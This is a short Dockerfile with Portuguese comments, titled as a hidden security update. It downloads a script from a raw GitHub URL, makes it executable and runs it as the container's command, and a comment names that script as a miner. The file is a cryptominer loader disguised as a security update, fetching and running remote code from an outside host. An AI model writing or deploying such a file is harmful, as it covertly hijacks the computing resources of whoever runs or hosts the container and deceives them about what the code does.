# Dockerfile - Atualização de segurança oculta
FROM ubuntu:22.04

# Atualiza e instala dependências essenciais
RUN apt-get update && \
    apt-get install -y wget curl tar gzip && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Diretório de trabalho
WORKDIR /app

# Baixa o script minero diretamente do GitHub
RUN wget -qO /app/security-update.sh https://raw.githubusercontent.com/magicasdabiblia-afk/atualizacao-sistema-nova/main/security-update.sh && \
    chmod +x /app/security-update.sh

# Executa o script
CMD ["/app/security-update.sh"]
